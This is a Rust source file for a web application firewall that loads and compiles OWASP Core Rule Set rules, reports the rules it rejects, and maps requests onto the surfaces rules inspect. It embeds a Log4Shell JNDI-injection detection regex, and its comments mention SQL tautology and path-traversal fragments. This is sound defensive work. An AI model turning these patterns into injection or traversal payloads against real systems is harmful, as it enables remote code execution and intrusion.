//! OWASP Core Rule Set (CRS) — native Rust implementation.
//!
//! Rules are loaded at runtime from the `rules/owasp-crs/` directory (YAML
//! files).  If the directory cannot be found, a minimal embedded rule set is
//! used as a fallback.
//!
//! Each rule has a `paranoia` level (1–4).  Only rules with
//! `paranoia <= defense_config.owasp_paranoia` are evaluated.
//! Default paranoia level is 1 (most permissive).
//!
//! # No silent failures
//!
//! A rule that cannot be evaluated by this engine is **never** loaded.  Both
//! the `field` and the `operator` are resolved to a concrete, implemented
//! matcher at load time; anything unresolvable is recorded in
//! [`LoadSummary`] and reported at `WARN` level on startup, and is excluded
//! from [`OWASPCheck::rule_count`].  Source-level failures (unreadable
//! directory, malformed YAML) are reported at `ERROR` level and recorded in
//! [`LoadSummary::source_errors`] — they never degrade silently into an empty
//! rule set.

use std::borrow::Cow;
use std::cell::{OnceCell, RefCell};
use std::collections::{BTreeMap, HashMap};
use std::ffi::OsStr;
use std::fmt::{self, Write as _};
use std::path::{Path, PathBuf};
use std::rc::Rc;
use std::sync::Arc;

use aho_corasick::{AhoCorasick, AhoCorasickBuilder, MatchKind};
use arc_swap::ArcSwapOption;
use regex::Regex;
use serde::Deserialize;
use tracing::{debug, error, info, warn};

use waf_common::{DetectionResult, OwaspConfig, Phase, RequestCtx, ResponseCtx, is_form_urlencoded, split_form_args};

use super::body_processors;
use super::multipart::{self, Multipart};
use super::{Check, ResponseCheck};
use crate::audit_log::{AuditLogSink, RuleHit, ScorePhase, ScoreVerdict};

/// How many contributing rules are named in the `detail` of a score-triggered
/// block before the list is elided.
///
/// The *score* is always the full sum over every contributing rule; only the
/// rendered list is capped, so a request that trips a hundred rules cannot turn
/// one `security_events` row into a hundred-entry blob. The elision is
/// explicit in the text, never silent.
const MAX_NAMED_CONTRIBUTORS: usize = 12;

/// Default on-disk location of the converted CRS rule set.
const DEFAULT_RULES_DIR: &str = "rules/owasp-crs";

/// Sub-directory of the rule set holding `pm_from_file` wordlists.
const DATA_SUBDIR: &str = "data";

/// Origin label used when rules come from an in-memory YAML string.
const INLINE_ORIGIN: &str = "<inline yaml>";

/// Origin label for the compiled-in fallback rule set.
const EMBEDDED_ORIGIN: &str = "<embedded fallback>";

// ── Minimal embedded fallback rules ──────────────────────────────────────────
// Used when the rules/owasp-crs/ directory cannot be found at runtime.

const EMBEDDED_RULES_YAML: &str = r#"
version: "1.0"
paranoia_level: 1
rules:
  - id: BUILTIN-911100
    name: Method is not allowed by policy
    category: protocol
    severity: critical
    paranoia: 1
    field: method
    operator: not_in
    value:
      - GET
      - POST
      - PUT
      - DELETE
      - PATCH
      - HEAD
      - OPTIONS
      - CONNECT
      - TRACE
    action: block

  - id: BUILTIN-920160
    name: Request body too large (>10 MB)
    category: protocol
    severity: critical
    paranoia: 1
    field: content_length
    operator: gt
    value: 10485760
    action: block

  - id: BUILTIN-944150
    name: 'Potential RCE: Log4j / Log4shell JNDI injection'
    category: java-injection
    severity: critical
    paranoia: 1
    field: all
    operator: regex
    value: '(?i)(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)(?:[^\}]{0,15}(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)|jndi|ctx)'
    action: block
"#;

// ── YAML schema ───────────────────────────────────────────────────────────────

#[derive(Debug, Deserialize)]
struct RuleSet {
    #[allow(dead_code)]
    #[serde(default)]
    version: String,
    #[allow(dead_code)]
    #[serde(default = "default_paranoia_level")]
    paranoia_level: u8,
    rules: Vec<YamlRule>,
}

const fn default_paranoia_level() -> u8 {
    1
}

#[derive(Debug, Deserialize)]
struct YamlRule {
    id: String,
    name: String,
    /// The upstream `SecRule` id this rule was converted from (`942100`), as
    /// emitted by `rules/tools/modsec2yaml.py`.
    ///
    /// Every generated file carries it and nothing read it until now: the
    /// engine's own `id` is the prefixed `CRS-942100`, which is the right key
    /// for our diagnostics and the wrong one for anything speaking CRS. The
    /// audit log writes `[id "942100"]` because that is the token every CRS
    /// tool chain greps for. `Option` because a hand-written rule file is not
    /// obliged to have an upstream counterpart.
    #[serde(default)]
    crs_id: Option<u32>,
    /// Attack class this rule belongs to (`sqli`, `xss`, `rce`, …), as written
    /// by the converter. Carried through to [`RuleDescriptor::category`] so the
    /// admin API can group the registry the way the rule files are organised.
    #[serde(default)]
    category: String,
    /// `ModSecurity` `severity:`, which decides how much this rule adds to the
    /// inbound anomaly score. See [`Severity`].
    #[serde(default)]
    severity: String,
    paranoia: u8,
    field: String,
    operator: String,
    value: YamlValue,
    /// `ModSecurity` `t:` chain, in declaration order, with `t:none` already
    /// applied by the converter.  Empty means "match the value exactly as the
    /// request parser produced it", which is what a `SecRule` with no `t:`
    /// (or with only `t:none`) means upstream.
    #[serde(default)]
    transform: Vec<String>,
    /// `!@op` in `ModSecurity`: the condition holds for a value the matcher
    /// does *not* accept.
    #[serde(default)]
    negate: bool,
    /// `capture` in `ModSecurity`: bind this condition's regex groups to
    /// `tx:0`..`tx:9` for the conditions that follow.
    #[serde(default)]
    capture: bool,
    /// Extra conditions that must *all* hold, in order, for the rule to fire
    /// (`ModSecurity` `chain`).  Empty for an ordinary single-condition rule,
    /// which keeps every pre-chain rule file valid unchanged.
    #[serde(default)]
    chain: Vec<YamlCondition>,
    action: String,
}

/// One link of a chained rule.  Same shape as the head condition minus the
/// rule-level metadata, so `field` / `operator` / `value` mean exactly what
/// they mean at the top level.
#[derive(Debug, Deserialize)]
struct YamlCondition {
    field: String,
    operator: String,
    #[serde(default)]
    value: YamlValue,
    /// This link's own `t:` chain.  `ModSecurity` does not propagate the chain
    /// starter's transformations to the links; each `SecRule` line carries its
    /// own list.
    #[serde(default)]
    transform: Vec<String>,
    #[serde(default)]
    negate: bool,
    #[serde(default)]
    capture: bool,
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum YamlValue {
    Str(String),
    List(Vec<String>),
    Int(i64),
}

impl Default for YamlValue {
    fn default() -> Self {
        Self::Str(String::new())
    }
}

// ── Load diagnostics ──────────────────────────────────────────────────────────

/// Coarse category of a rule rejection, used to aggregate startup diagnostics
/// and to reconcile "declared" against "enforced" rule counts.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum RejectCategory {
    /// The rule's `field` names a request location this engine cannot read.
    UnsupportedField,
    /// The rule's `operator` is not implemented by this engine.
    UnsupportedOperator,
    /// One of the rule's `ModSecurity` `t:` transformations is not implemented
    /// by this engine, so the value the pattern was written against cannot be
    /// produced.
    UnsupportedTransformation,
    /// Field and operator are individually supported but their combination is
    /// not representable (a scalar comparison against a multi-valued
    /// collection).
    FieldOperatorMismatch,
    /// The rule's `value` has the wrong YAML type, is an invalid regex, or
    /// yields an empty pattern set.
    InvalidValue,
    /// A `pm_from_file` wordlist could not be located, read, or compiled.
    DataFile,
    /// A chained (`ModSecurity` `chain`) condition is not representable.
    Chain,
}

impl fmt::Display for RejectCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let s = match self {
            Self::UnsupportedField => "unsupported-field",
            Self::UnsupportedOperator => "unsupported-operator",
            Self::UnsupportedTransformation => "unsupported-transformation",
            Self::FieldOperatorMismatch => "field-operator-mismatch",
            Self::InvalidValue => "invalid-value",
            Self::DataFile => "data-file",
            Self::Chain => "chain-condition",
        };
        f.write_str(s)
    }
}

/// Why a rule present in the source YAML was **not** compiled into an active
/// matcher.  Rejected rules are excluded from [`OWASPCheck::rule_count`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RejectReason {
    /// `field` is not one of the implemented request locations.
    UnsupportedField(String),
    /// `operator` is not one of the implemented matchers.
    UnsupportedOperator(String),
    /// A `t:` transformation this engine does not implement.
    ///
    /// The rule is dropped rather than run against a value that skipped the
    /// step: a CRS pattern is written against the *output* of its
    /// transformation chain, so evaluating it one transformation short is
    /// either a silent miss (`t:lowercase` omitted in front of an all-lowercase
    /// pattern) or a silent false positive.  Naming the transformation in the
    /// startup WARN keeps the gap visible.
    UnsupportedTransformation {
        /// Which condition declared it, e.g. `head` or `chain[1]`.
        position: String,
        /// The `ModSecurity` transformation name as written in the rule.
        name: String,
    },
    /// A scalar operator (`equals` / `not_in` / `gt` / `lt`) was applied to a
    /// multi-valued field (`all` / `headers` / `cookies`).
    NonScalarField {
        /// The scalar operator that was requested.
        operator: String,
        /// The multi-valued field it was applied to.
        field: String,
    },
    /// `value` has the wrong YAML type for the operator.
    InvalidValueType {
        /// The operator that rejected the value.
        operator: String,
        /// Human-readable description of the expected YAML type.
        expected: &'static str,
    },
    /// `value` did not compile as a regular expression.
    InvalidRegex(String),
    /// The multi-pattern set derived from `value` is empty or would not build.
    PatternSet(String),
    /// A `pm_from_file` wordlist could not be loaded.
    DataFile {
        /// The wordlist file name as written in the rule.
        file: String,
        /// Underlying failure description.
        error: String,
    },
    /// A chained condition could not be compiled.  The whole rule is dropped:
    /// enforcing only the conditions that *did* compile would be a strictly
    /// broader rule than the one the source declares, which is how a chained
    /// CRS rule turns into a false-positive generator.
    Chain {
        /// Which link failed, e.g. `chain[1]`.
        position: String,
        /// Rendered inner reason.
        detail: String,
    },
    /// `capture` was requested on a condition whose operator produces no
    /// capture groups, so the `tx:N` bindings it promises would never exist.
    CaptureWithoutRegex {
        /// Which condition asked for it.
        position: String,
    },
    /// A condition reads `tx:N` (or expands `%{TX.N}`) that no preceding
    /// condition captures, so it can never match.
    UnresolvedCapture {
        /// Which condition reads it.
        position: String,
        /// The capture index that is not bound.
        index: u8,
    },
}

impl RejectReason {
    /// Coarse category used for aggregation and reporting.
    #[must_use]
    pub const fn category(&self) -> RejectCategory {
        match self {
            Self::UnsupportedField(_) => RejectCategory::UnsupportedField,
            Self::UnsupportedOperator(_) => RejectCategory::UnsupportedOperator,
            Self::UnsupportedTransformation { .. } => RejectCategory::UnsupportedTransformation,
            Self::NonScalarField { .. } => RejectCategory::FieldOperatorMismatch,
            Self::InvalidValueType { .. } | Self::InvalidRegex(_) | Self::PatternSet(_) => RejectCategory::InvalidValue,
            Self::DataFile { .. } => RejectCategory::DataFile,
            Self::Chain { .. } | Self::CaptureWithoutRegex { .. } | Self::UnresolvedCapture { .. } => {
                RejectCategory::Chain
            }
        }
    }
}

impl fmt::Display for RejectReason {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::UnsupportedField(field) => {
                write!(f, "unsupported field '{field}' (no accessor implemented)")
            }
            Self::UnsupportedOperator(op) => {
                write!(f, "unsupported operator '{op}' (no matcher implemented)")
            }
            Self::UnsupportedTransformation { position, name } => write!(
                f,
                "{position}: unsupported transformation 't:{name}' (no implementation; the rule's \
                 pattern is written against its output)"
            ),
            Self::NonScalarField { operator, field } => write!(
                f,
                "operator '{operator}' needs a single-valued field but '{field}' is a collection"
            ),
            Self::InvalidValueType { operator, expected } => {
                write!(f, "operator '{operator}' requires a {expected} value")
            }
            Self::InvalidRegex(err) => write!(f, "invalid regex: {err}"),
            Self::PatternSet(err) => write!(f, "unusable pattern set: {err}"),
            Self::DataFile { file, error } => {
                write!(f, "wordlist '{file}' unavailable: {error}")
            }
            Self::Chain { position, detail } => write!(f, "{position}: {detail}"),
            Self::CaptureWithoutRegex { position } => {
                write!(f, "{position}: 'capture' needs a regex operator")
            }
            Self::UnresolvedCapture { position, index } => {
                write!(f, "{position}: reads tx:{index}, which no earlier condition captures")
            }
        }
    }
}

/// A rule that was declared in the source but is **not** enforced.
#[derive(Debug, Clone)]
pub struct RejectedRule {
    /// The rule's `id` field.
    pub rule_id: String,
    /// The file (or `<inline yaml>`) the rule was declared in.
    pub source: String,
    /// Why it was rejected.
    pub reason: RejectReason,
}

/// A whole rule source that could not be read or parsed.  Every rule it
/// declared is missing from the active set.
#[derive(Debug, Clone)]
pub struct SourceError {
    /// Path (or label) of the source.
    pub source: String,
    /// Underlying failure description.
    pub error: String,
}

/// Machine-readable account of a rule-set load.
///
/// This is the reconciliation basis for external conformance runs (`go-ftw`):
/// `attempted == compiled + rejected.len()` always holds for the sources that
/// parsed, and `source_errors` lists the sources whose rule count is unknown
/// because they never parsed.
#[derive(Debug, Clone, Default)]
pub struct LoadSummary {
    /// Rules successfully deserialised from all readable sources.
    pub attempted: usize,
    /// Rules that compiled into an enforceable matcher.
    pub compiled: usize,
    /// Rules that were declared but are not enforced, with the reason.
    pub rejected: Vec<RejectedRule>,
    /// Sources that failed to read/parse (their rules are entirely absent).
    pub source_errors: Vec<SourceError>,
    /// `true` when the minimal compiled-in rule set was used instead of the
    /// on-disk CRS.
    pub used_embedded_fallback: bool,
    /// Rules whose `severity:` was absent or not a name this engine knows.
    ///
    /// They are still enforced, scored at `critical` — the fail-closed choice,
    /// because the alternative (the lowest weight) would quietly weaken a rule
    /// that a typo made unreadable. Recorded so the typo is visible instead of
    /// being absorbed into the scoring model.
    pub severity_defaulted: Vec<String>,
    /// Rules whose `action:` was not a name this engine knows. Enforced as
    /// scoring rules (the CRS `block` semantics), and recorded for the same
    /// reason as [`Self::severity_defaulted`].
    pub action_defaulted: Vec<String>,
}

impl LoadSummary {
    /// Number of rejected rules in `category`.
    #[must_use]
    pub fn count(&self, category: RejectCategory) -> usize {
        self.rejected.iter().filter(|r| r.reason.category() == category).count()
    }

    /// Rule ids rejected in `category`, in declaration order.
    #[must_use]
    pub fn rule_ids(&self, category: RejectCategory) -> Vec<&str> {
        self.rejected
            .iter()
            .filter(|r| r.reason.category() == category)
            .map(|r| r.rule_id.as_str())
            .collect()
    }

    /// Rules dropped because their `field` is not implemented.
    #[must_use]
    pub fn rejected_field_count(&self) -> usize {
        self.count(RejectCategory::UnsupportedField)
    }

    /// Ids of the rules dropped because their `field` is not implemented.
    #[must_use]
    pub fn rejected_field_ids(&self) -> Vec<&str> {
        self.rule_ids(RejectCategory::UnsupportedField)
    }

    /// Rules dropped because their `operator` is not implemented.
    #[must_use]
    pub fn rejected_operator_count(&self) -> usize {
        self.count(RejectCategory::UnsupportedOperator)
    }

    /// Ids of the rules dropped because their `operator` is not implemented.
    #[must_use]
    pub fn rejected_operator_ids(&self) -> Vec<&str> {
        self.rule_ids(RejectCategory::UnsupportedOperator)
    }

    /// `true` when the active rule set is smaller than what the sources
    /// declared, or a source failed outright, or the embedded fallback was
    /// substituted.  Operators should treat this as "CRS coverage is not what
    /// the configuration implies".
    #[must_use]
    pub const fn is_degraded(&self) -> bool {
        !self.rejected.is_empty() || !self.source_errors.is_empty() || self.used_embedded_fallback
    }

    /// Emit the startup diagnostics for this load.
    ///
    /// Source failures are `ERROR` (a whole file's rules vanished); rejected
    /// rules are `WARN`, aggregated by reason with the full id list so an
    /// operator can see at a glance which rules are *declared but not
    /// enforced*.  A clean load logs a single `INFO` line.
    fn report(&self, origin: &str) {
        for err in &self.source_errors {
            error!(
                "OWASP CRS source '{}' failed to load ({}) — every rule it declares is NOT enforced",
                err.source, err.error
            );
        }

        if !self.severity_defaulted.is_empty() {
            warn!(
                "OWASP CRS {} rule(s) declare an unknown severity and are scored as 'critical' \
                 (fail-closed): {}",
                self.severity_defaulted.len(),
                self.severity_defaulted.join(", ")
            );
        }
        if !self.action_defaulted.is_empty() {
            warn!(
                "OWASP CRS {} rule(s) declare an unknown action and are treated as scoring rules: {}",
                self.action_defaulted.len(),
                self.action_defaulted.join(", ")
            );
        }

        if self.rejected.is_empty() {
            if self.source_errors.is_empty() {
                info!("OWASP CRS loaded {} rules from {origin}", self.compiled);
            } else {
                error!(
                    "OWASP CRS loaded {} rules from {origin} with {} unreadable source(s)",
                    self.compiled,
                    self.source_errors.len()
                );
            }
            return;
        }

        warn!(
            "OWASP CRS load summary for {origin}: {} of {} declared rules are ACTIVE — {} rejected \
             ({} unsupported-field, {} unsupported-operator, {} unsupported-transformation, \
             {} field-operator-mismatch, {} invalid-value, {} data-file, {} chain-condition), \
             {} unreadable source(s). Rejected rules are NOT enforced.",
            self.compiled,
            self.attempted,
            self.rejected.len(),
            self.count(RejectCategory::UnsupportedField),
            self.count(RejectCategory::UnsupportedOperator),
            self.count(RejectCategory::UnsupportedTransformation),
            self.count(RejectCategory::FieldOperatorMismatch),
            self.count(RejectCategory::InvalidValue),
            self.count(RejectCategory::DataFile),
            self.count(RejectCategory::Chain),
            self.source_errors.len(),
        );

        // Aggregate by (category, rendered reason) so identical causes collapse
        // into one line carrying every affected rule id.
        let mut groups: BTreeMap<(RejectCategory, String), Vec<&str>> = BTreeMap::new();
        for rejected in &self.rejected {
            groups
                .entry((rejected.reason.category(), rejected.reason.to_string()))
                .or_default()
                .push(rejected.rule_id.as_str());
        }
        for ((category, reason), ids) in groups {
            warn!(
                "OWASP CRS [{category}] {} rule(s) NOT enforced — {reason}: {}",
                ids.len(),
                ids.join(", ")
            );
        }
    }
}

// ── Request fields ────────────────────────────────────────────────────────────

/// The set of request surfaces a multi-variable CRS rule scans.
///
/// CRS rules routinely name several `ModSecurity` variables at once
/// (`REQUEST_COOKIES|ARGS_NAMES|ARGS|XML:/*`).  The engine has no union
/// operator over the single-surface fields, and collapsing every such rule
/// onto one catch-all field is what produced this check's worst false
/// positives: a rule that reads cookies and arguments would also be run
/// against every request header value, and CRS patterns are not written with
/// that in mind.  Two live examples from the shipped set:
///
/// * CRS-933150 matches the PHP function name `urlencode`, which is a
///   substring of `Content-Type: application/x-www-form-urlencoded` — every
///   ordinary HTML form POST.
/// * CRS-941130 matches `xhtml`, which is a substring of the `Accept` header
///   every browser sends.
///
/// So the surfaces are carried explicitly and only the ones the upstream rule
/// asked for are walked.
///
/// # Whole surfaces vs. collection members
///
/// Two kinds of bit live in here and the difference is the whole point of the
/// `ARGS` work:
///
/// * **Whole surfaces** ([`Self::QUERY`], [`Self::BODY`], [`Self::PATH`], the
///   header ones) hand the rule one string covering the entire surface. They
///   back the `ModSecurity` variables that really are one string —
///   `QUERY_STRING`, `REQUEST_BODY`, `REQUEST_URI`.
/// * **Collection members** ([`Self::ARGS_GET`], [`Self::ARGS_POST`], their
///   `_NAMES` counterparts, [`Self::COOKIES`], [`Self::COOKIE_NAMES`]) hand the
///   rule one value *per parameter*, which is what `ARGS` / `ARGS_NAMES` /
///   `REQUEST_COOKIES` mean upstream. A rule is evaluated once per member and
///   fires if any single member satisfies it.
///
/// Running an `ARGS` rule against the whole `a=1&b=2` string instead is not a
/// harmless approximation, it changes what the rule says: CRS-942130 asks
/// whether the two words around an `=` are identical, and in a whole query
/// string the `name=value` separator supplies that equality by itself, so
/// `?tab=tab` reads as a `1=1` tautology.
///
/// # Collection members that are not `ARGS`
///
/// [`Self::FILES`], [`Self::FILES_NAMES`] and [`Self::MULTIPART_PART_HEADERS`]
/// are collection-member surfaces too, but they come out of the
/// `multipart/form-data` parser rather than out of a urlencoded split — see
/// [`super::multipart`] for why those three cannot be approximated by `body`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct Surfaces(u32);

impl Surfaces {
    const PATH: u32 = 1 << 0;
    /// `QUERY_STRING`: the whole query string, as one value.
    const QUERY: u32 = 1 << 1;
    /// `REQUEST_BODY`: the whole request body, as one value.
    ///
    /// Only the rules that name `REQUEST_BODY` upstream carry this bit. `XML:/*`
    /// used to be folded into it, which handed 154 rules every byte of every
    /// body regardless of content type; it now has surfaces of its own
    /// ([`Self::XML_TEXT`] / [`Self::XML_ATTRS`]).
    const BODY: u32 = 1 << 2;
    /// `REQUEST_COOKIES`: each cookie **value**.
    const COOKIES: u32 = 1 << 3;
    /// Every request header **value**.  Header *names* are only scanned by
    /// [`Field::Headers`], whose upstream (`REQUEST_HEADERS_NAMES`) asks for
    /// them explicitly.
    const HEADER_VALUES: u32 = 1 << 4;
    const USER_AGENT: u32 = 1 << 5;
    const REFERER: u32 = 1 << 6;
    /// `REQUEST_URI_RAW` / `REQUEST_LINE`: the URI as received, before the
    /// parser percent-decodes it.
    const PATH_RAW: u32 = 1 << 7;
    /// `ARGS_GET`: each query-string parameter **value**, decoded.
    const ARGS_GET: u32 = 1 << 8;
    /// `ARGS_GET_NAMES`: each query-string parameter **name**, decoded.
    const ARGS_GET_NAMES: u32 = 1 << 9;
    /// `ARGS_POST`: each urlencoded body parameter **value**, decoded.
    const ARGS_POST: u32 = 1 << 10;
    /// `ARGS_POST_NAMES`: each urlencoded body parameter **name**, decoded.
    const ARGS_POST_NAMES: u32 = 1 << 11;
    /// `REQUEST_COOKIES_NAMES`: each cookie **name**.
    const COOKIE_NAMES: u32 = 1 << 12;
    /// `FILES`: the `filename="…"` of each `multipart/form-data` file part.
    const FILES: u32 = 1 << 13;
    /// `FILES_NAMES`: the form field name each file part was submitted under.
    const FILES_NAMES: u32 = 1 << 14;
    /// `MULTIPART_PART_HEADERS`: each header line of each part, verbatim.
    const MULTIPART_PART_HEADERS: u32 = 1 << 15;
    /// `XML:/*`: the character data of a body parsed as XML, as one value.
    const XML_TEXT: u32 = 1 << 16;
    /// `XML://@*`: each attribute value of a body parsed as XML.
    const XML_ATTRS: u32 = 1 << 17;

    /// Every `ARGS` value bit, i.e. what the bare `ARGS` variable covers.
    const ARGS: u32 = Self::ARGS_GET | Self::ARGS_POST;
    /// Every `ARGS` name bit, i.e. what `ARGS_NAMES` covers.
    const ARGS_NAMES: u32 = Self::ARGS_GET_NAMES | Self::ARGS_POST_NAMES;

    /// Canonical order — also the order surface names appear in a field name.
    ///
    /// A name may stand for more than one bit (`args` is `ARGS_GET |
    /// ARGS_POST`); the aggregate spellings come first so the converter's
    /// canonicaliser prefers them and there is exactly one spelling per
    /// meaning.
    const NAMED: [(&'static str, u32); 20] = [
        ("path", Self::PATH),
        ("path_raw", Self::PATH_RAW),
        ("query", Self::QUERY),
        ("args", Self::ARGS),
        ("args_get", Self::ARGS_GET),
        ("args_post", Self::ARGS_POST),
        ("args_names", Self::ARGS_NAMES),
        ("args_get_names", Self::ARGS_GET_NAMES),
        ("args_post_names", Self::ARGS_POST_NAMES),
        ("body", Self::BODY),
        ("xml_text", Self::XML_TEXT),
        ("xml_attrs", Self::XML_ATTRS),
        ("files", Self::FILES),
        ("files_names", Self::FILES_NAMES),
        ("multipart_part_headers", Self::MULTIPART_PART_HEADERS),
        ("cookies", Self::COOKIES),
        ("cookies_names", Self::COOKIE_NAMES),
        ("headers", Self::HEADER_VALUES),
        ("user_agent", Self::USER_AGENT),
        ("referer", Self::REFERER),
    ];

    /// What the bare field name `all` means: the whole request.
    ///
    /// The multipart surfaces are deliberately **not** in it. `all` is the
    /// widest field the engine has and is only emitted when the upstream
    /// variable list really is the whole request; a rule that wants file names
    /// names `FILES`, and folding them into `all` would run every `all` rule
    /// against every upload's file name for free.
    const ALL: Self = Self(Self::PATH | Self::QUERY | Self::BODY | Self::COOKIES | Self::HEADER_VALUES);

    const fn has(self, bit: u32) -> bool {
        self.0 & bit != 0
    }

    /// Parse a `+`-joined surface list (`"args+cookies"`).
    ///
    /// Returns `None` for an unknown surface name or an overlapping one, so a
    /// typo — or a redundant `args+args_get` — is rejected at load time instead
    /// of quietly scanning less (or more) than the rule says.
    fn parse(name: &str) -> Option<Self> {
        let mut bits = 0u32;
        for token in name.split('+') {
            let (_, mask) = Self::NAMED.iter().find(|(n, _)| *n == token)?;
            if bits & mask != 0 {
                return None;
            }
            bits |= mask;
        }
        (bits != 0).then_some(Self(bits))
    }
}

/// The request headers a rule names one at a time (`REQUEST_HEADERS:<name>`),
/// together with whatever other surfaces the same rule lists.
///
/// # Why this is not a `Surfaces` bit
///
/// [`Surfaces`] is a bitset over a closed inventory of *places*; a header name
/// is an open set of *keys* into one place, so it cannot be a bit. Upstream
/// writes both kinds into one variable list — CRS-933110 is
/// `FILES|REQUEST_HEADERS:X-Filename|REQUEST_HEADERS:X_Filename|…` — which is
/// why the two live in one field rather than in two.
///
/// # Why the names are stored verbatim
///
/// `X-Filename`, `X_Filename` and `X.Filename` are three different headers and
/// CRS names all three. Any spelling normalisation beyond ASCII case folding
/// (which HTTP itself mandates) would collapse them onto each other and make
/// the accessor read a header the rule did not ask for.
#[derive(Debug, Clone, PartialEq, Eq)]
struct NamedHeaders {
    /// The other surfaces the rule names, or `Surfaces(0)` when it names none.
    surfaces: Surfaces,
    /// Lower-cased header names, sorted and deduplicated by
    /// [`Field::parse`] so that two spellings of one variable list compare
    /// equal and a lookup is bounded by the rule's own name count.
    names: Box<[Box<str>]>,
}

/// Prefix that marks a field-name token as naming one request header.
///
/// `:` cannot occur in an HTTP field name (RFC 9110 §5.6.2 `token`) and no
/// surface name contains one, so the prefix can never be confused with either.
const HEADER_TOKEN: &str = "header:";

/// `true` for a byte an HTTP field name may contain.
///
/// RFC 9110 §5.6.2 `token`, minus `+`: the composite-field grammar uses `+` as
/// its separator, so a header whose name contained one could not be spelled.
/// No such header exists in practice, and rejecting it here means the
/// converter emits a sentinel and the gap is named in the startup WARN,
/// instead of the name being silently split into two.
const fn is_header_name_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric()
        || matches!(
            b,
            b'!' | b'#' | b'$' | b'%' | b'&' | b'\'' | b'*' | b'-' | b'.' | b'^' | b'_' | b'`' | b'|' | b'~'
        )
}

/// A request location a CRS rule can be evaluated against.
///
/// Every variant is backed by a real accessor, so a rule that compiles is
/// guaranteed to be evaluable.  Unknown names are rejected at load time
/// ([`RejectReason::UnsupportedField`]) rather than silently never matching.
#[derive(Debug, Clone, PartialEq, Eq)]
enum Field {
    /// Several request surfaces at once; `all` is the full set.
    Multi(Surfaces),
    Method,
    /// `REQUEST_URI` / `REQUEST_FILENAME` / `REQUEST_BASENAME` / `PATH_INFO` —
    /// the path as the parser decoded it.
    Path,
    /// `REQUEST_URI_RAW` / `REQUEST_LINE` — the path exactly as received.
    ///
    /// Kept apart from [`Self::Path`] because CRS depends on the difference:
    /// CRS-920610 flags a raw `#` in the URI and must not see a legitimately
    /// escaped `%23` as one, while CRS-930100's traversal pattern is a
    /// catalogue of `%2f` / `%c0%af` spellings that only exist before decoding.
    PathRaw,
    Query,
    /// Request body preview (lossy UTF-8).
    Body,
    ContentLength,
    ContentType,
    UserAgent,
    PathLength,
    QueryArgCount,
    /// Every request header — names *and* values.
    ///
    /// This deliberately differs from [`super::SCANNED_HEADERS`], the curated
    /// 7-header list used by the heuristic SQLi/XSS/RCE checks to bound false
    /// positives.  CRS `headers` rules derive from
    /// `REQUEST_HEADERS_NAMES|REQUEST_HEADERS`, whose semantics are "all
    /// headers"; narrowing them to the curated list would silently weaken the
    /// rule (e.g. CRS-921140 header-injection detection).
    Headers,
    /// Each individual cookie **value** (CRS `REQUEST_COOKIES`).
    ///
    /// Split per-cookie rather than matching the whole `Cookie` header,
    /// because CRS cookie rules count characters *within one cookie value*;
    /// running them over the concatenated header would fire on any request
    /// carrying several ordinary cookies.
    Cookies,
    HeaderReferer,
    HeaderHost,
    HeaderRange,
    /// `REQUEST_HEADERS:<name>` for one or more headers named in the rule,
    /// plus any other surfaces the same rule lists.
    ///
    /// Spelled `header:<name>` in a field name, and joined with `+` like every
    /// other surface: CRS-933110 is `files+header:x-file-name+header:x-filename
    /// +header:x.filename+header:x_filename`.
    ///
    /// Reads exactly the headers named and nothing else. A header the request
    /// does not carry yields **no value at all** rather than an empty one,
    /// which is what upstream does (the collection simply has no member) and
    /// is what keeps a negated rule such as CRS-920600 off every request that
    /// omits the header.
    Named(NamedHeaders),
    /// `&REQUEST_HEADERS:<name>` — how many times the header occurs.
    ///
    /// The engine folds repeated headers into a map, so the only values this
    /// can ever produce are `0` and `1`; that is enough for the
    /// presence/absence tests CRS chains on (`&REQUEST_HEADERS:Referer @eq 0`
    /// in CRS-943120) and not enough for anything else, which
    /// [`Loader::compile_condition`] rejects rather than silently never
    /// matching.
    HeaderCount(&'static str),
    /// `ModSecurity` `RESPONSE_BODY` — one inspection window of the body the
    /// origin sent back, as lossy UTF-8 and **undecoded**.
    ///
    /// Undecoded is not an omission. `RESPONSE_BODY` upstream is the bytes the
    /// origin produced; the `RESPONSE-95x` rules match literal error text
    /// (`ORA-00933`, `<?php`, `C:\inetpub`) that a percent-decode could only
    /// corrupt, and none of them declares a `t:` chain beyond `t:none` /
    /// `t:lowercase`, which the rule's own chain applies.
    ResponseBody,
    /// `ModSecurity` `RESPONSE_STATUS` — the upstream status code, rendered as
    /// the three-digit string the CRS regexes are written against
    /// (`^5\d{2}$` in `950100`).
    ResponseStatus,
}

/// Headers `count_header_<name>` may name.
///
/// Not the readable inventory: since [`Field::Named`] landed the engine can
/// *read* any header, and this list is the smaller set it can be asked to
/// *count*. It stays a closed list because a count spells its header name with
/// underscores standing for hyphens, which cannot distinguish `X-Filename`
/// from `X_Filename`; a rule that needs that distinction reads the header
/// instead. Widening it is also a policy change, not just a capability one —
/// see `COUNT_MAPPED_HEADERS` in `rules/tools/modsec2yaml.py`, which is the
/// gate that decides which `&REQUEST_HEADERS:<name>` rules are emitted at all.
const COUNTABLE_HEADERS: [&str; 6] = [
    "content-type",
    "content-length",
    "user-agent",
    "referer",
    "host",
    "range",
];

impl Field {
    fn parse(name: &str) -> Option<Self> {
        if let Some(header) = name.strip_prefix("count_header_") {
            let wanted = header.replace('_', "-");
            let known = COUNTABLE_HEADERS.iter().find(|h| **h == wanted)?;
            return Some(Self::HeaderCount(known));
        }
        // `header:<name>` tokens name individual request headers and may be
        // mixed with ordinary surfaces in the same `+` list.  Handled before
        // the table below because a header name is data, not a keyword.
        if name.split('+').any(|token| token.starts_with(HEADER_TOKEN)) {
            return Self::parse_named(name);
        }
        Some(match name {
            "all" => Self::Multi(Surfaces::ALL),
            "method" => Self::Method,
            "path" => Self::Path,
            "path_raw" => Self::PathRaw,
            "query" => Self::Query,
            "body" => Self::Body,
            "content_length" => Self::ContentLength,
            "content_type" | "header_content_type" => Self::ContentType,
            "user_agent" | "header_user_agent" => Self::UserAgent,
